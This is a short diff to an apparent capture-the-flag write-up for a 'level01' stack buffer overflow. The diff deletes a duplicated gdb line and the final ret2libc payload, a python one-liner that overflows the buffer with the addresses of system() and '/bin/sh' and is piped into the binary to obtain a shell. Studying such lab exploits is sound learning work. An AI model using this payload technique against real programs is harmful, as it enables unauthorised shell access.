@@ -27,8 +27,6 @@ Mapped address spaces:
 	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
 (gdb) 
 
-(gdb) (gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
-Undefined command: "".  Try "help".
 (gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
 0xf7f897ec
 1 pattern found.
@@ -72,7 +70,7 @@ The vulnerability is a **stack buffer overflow** in the password input function.
 ### Final Payload Execution
 
 ```bash
-(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "EXIT"+ "\xec\x97\xf8\xf7"'; cat) | ./level01
+
 ``` 
 
 - `cat` → keeps stdin open for interactive shell
